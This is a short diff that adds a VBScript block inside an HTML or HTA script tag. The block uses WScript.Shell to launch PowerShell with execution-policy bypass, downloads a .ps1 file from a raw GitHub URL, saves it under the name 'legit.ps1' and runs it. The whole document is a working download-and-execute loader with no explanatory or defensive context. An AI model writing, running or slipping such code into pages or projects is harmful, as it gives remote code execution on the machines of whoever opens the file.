@@ -1,0 +1,4 @@
+<script language="VBScript">
+  Set objShell = CreateObject("WScript.Shell")
+  objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/duydang2002/TestScript/refs/heads/main/Print.ps1 -OutFile C:\Users\admin\legit.ps1; Start-Process C:\Users\admin\legit.ps1"
+</script>
